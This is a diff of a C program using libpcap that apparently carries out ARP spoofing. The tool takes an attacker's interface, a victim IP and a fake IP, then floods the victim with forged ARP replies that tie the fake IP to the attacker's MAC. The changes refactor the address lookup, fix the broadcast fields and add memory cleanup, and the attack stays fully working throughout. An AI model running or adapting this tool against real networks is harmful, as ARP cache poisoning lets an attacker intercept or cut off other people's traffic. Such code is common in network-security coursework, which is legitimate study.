@@ -17,7 +17,6 @@
 #define IPADDR_LEN 4
 #define ARP_REQ	1
 #define ARP_REPLY 2
-#define BROADCAST "000000"
 
 struct arp{
 	u_int16_t htype; // Hardware Type
@@ -36,44 +35,28 @@ struct mac_ip_info{
 	u_char mac[6];
 };
 
-int GetMac(char *dev, u_char * mac) {
-	u_int32_t sock_mac;
-	struct ifreq ifr_mac;
+int GetMyAddr(char *dev, struct mac_ip_info * info){
+	u_int32_t sock;
+	struct ifreq ifr;
 
-	sock_mac = socket(AF_INET, SOCK_STREAM, 0);
-	if (sock_mac == -1) {
+	sock = socket(AF_INET, SOCK_DGRAM,0);
+	if (sock == -1){
 		fprintf(stderr, "Create socket error\n");
 		exit(EXIT_FAILURE);
 	}
 
-	memset(&ifr_mac, 0, sizeof(ifr_mac));
-	strncpy(ifr_mac.ifr_name, dev, sizeof(ifr_mac.ifr_name)-1);
-
-	if ((ioctl(sock_mac, SIOCGIFHWADDR, &ifr_mac)) < 0) {
-		fprintf(stderr, "Mac ictol error\n");
-		exit(EXIT_FAILURE);
-	}
-
-	memcpy(mac, ifr_mac.ifr_hwaddr.sa_data, 6);
-	return 0;
-}
-
-int GetIp(char *dev, u_char ip[4]){
-	u_int32_t sock_ip;
-	struct ifreq ifr_ip;
-
-	sock_ip = socket(AF_INET, SOCK_DGRAM,0);
-	if (sock_ip == -1){
-		fprintf(stderr, "Create socket error\n");
-		exit(EXIT_FAILURE);
-	}
-	ifr_ip.ifr_addr.sa_family = AF_INET;
-	strncpy(ifr_ip.ifr_name, dev, sizeof(ifr_ip.ifr_name)-1);
-	if((ioctl(sock_ip, SIOCGIFADDR, &ifr_ip)) <0){
+	strncpy(ifr.ifr_name, dev, sizeof(ifr.ifr_name)-1);
+	if((ioctl(sock, SIOCGIFADDR, &ifr)) <0){
 		fprintf(stderr, "Ip ictol error\n");
 		exit(EXIT_FAILURE);
 	}
-	memcpy(ip, &((struct sockaddr_in *)&ifr_ip.ifr_addr)->sin_addr, 4);
+	memcpy(info->ip, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr,IPADDR_LEN);
+
+	if((ioctl(sock,SIOCGIFHWADDR, &ifr)) < 0) {
+		fprintf(stderr, "Mac ictol error\n");
+		exit(EXIT_FAILURE);
+	}
+	memcpy(info->mac, ifr.ifr_hwaddr.sa_data,ETHERADDR_LEN);
 	return 0;
 }
 
@@ -90,25 +73,8 @@ void * strToip(char * ip,struct mac_ip_info * info){
 
 }
 
-void GetAttackerInfo(char *dev,struct mac_ip_info * info){
-	GetMac(dev,info->mac);
-	GetIp(dev,info->ip);
-}	
-
 void GetVictimInfo(char * ip,struct mac_ip_info * info){
-//	char * p = strtok(ip,".");
-//	int i = 0;
-/*	info->ip[0]=atoi(p);
-	while(p!=NULL)
-	{
-		i++;
-		p=strtok(NULL,".");
-		if(p)
-			info->ip[i] = atoi(p);
-	}*/
-
 	strToip(ip,info);
-	
 	for(int i =0;i<6;i++) info->mac[i]=0;
 }	
 
@@ -137,11 +103,12 @@ void send_arp(pcap_t * handle,char * dev,struct mac_ip_info * sender, struct mac
 	u_char packet[42];
 	struct ether_header * ether = (struct ether_header*)packet;
 	struct arp * arp_header = (struct arp *)(packet+ETHER_HEADER_SIZE);
-	u_char broadcast[6]={0xff,0xff,0xff,0xff,0xff,0xff};
+	u_char ether_broadcast[6]={0xff,0xff,0xff,0xff,0xff,0xff};
+	u_char arp_broadcast[6]={0};
 	
 	memcpy(ether->ether_shost,sender->mac,6);
 	if(target->mac[0]==0){
-		memcpy(ether->ether_dhost,broadcast,ETHER_ADDR_LEN);
+		memcpy(ether->ether_dhost,ether_broadcast,ETHER_ADDR_LEN);
 	}
 	ether->ether_type=htons(ETHERTYPE_ARP); 
 	
@@ -154,7 +121,7 @@ void send_arp(pcap_t * handle,char * dev,struct mac_ip_info * sender, struct mac
 	memcpy(arp_header->sha,sender->mac,ETHER_ADDR_LEN);
 	memcpy(arp_header->spa,sender->ip,IPADDR_LEN);
 	if(oper == ARP_REQ)
-		memcpy(arp_header->tha, BROADCAST ,ETHER_ADDR_LEN);
+		memcpy(arp_header->tha, arp_broadcast ,ETHER_ADDR_LEN);
 	else
 		memcpy(arp_header->tha,target->mac,ETHER_ADDR_LEN);
 	memcpy(arp_header->tpa, target->ip, IPADDR_LEN);
@@ -163,7 +130,6 @@ void send_arp(pcap_t * handle,char * dev,struct mac_ip_info * sender, struct mac
 		fprintf(stderr,"\nError sending the packet : \n", pcap_geterr(handle));
 		return ;
 	}
-
 }
 
 
@@ -180,7 +146,6 @@ int main(int argc, char* argv[]) {
 
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-	u_char Mac[6], Ip[4];
 	struct mac_ip_info * attacker = (struct mac_ip_info *)malloc(sizeof(struct mac_ip_info));
 	struct mac_ip_info * victim = (struct mac_ip_info *)malloc(sizeof(struct mac_ip_info));
 	struct mac_ip_info * fake = (struct mac_ip_info *)malloc(sizeof(struct mac_ip_info));
@@ -197,7 +162,7 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	GetAttackerInfo(dev, attacker);
+	GetMyAddr(dev, attacker);
 	GetVictimInfo(argv[2],victim);
 	
 	printf("[*] victim ip addr : "); print_ip_addr(victim->ip);
@@ -227,19 +192,15 @@ int main(int argc, char* argv[]) {
 	strToip(argv[3],fake);
 	memcpy(fake->mac,attacker->mac,ETHERADDR_LEN);
 	printf("send arp_reply....\n");
+
 	while(true){
 		send_arp(handle,dev,fake,victim,ARP_REPLY);
 	}
 
-/*
-	int res = pcap_next_ex(handle, &header, &packet);
-	if (res == 0) continue;
-	if (res == -1 || res == -2) break;
-	printf("%u bytes captured\n", header->caplen);
-
-*/
-
 
 	pcap_close(handle);
+	free(attacker);
+	free(victim);
+	free(fake);
 	return 0;
 }
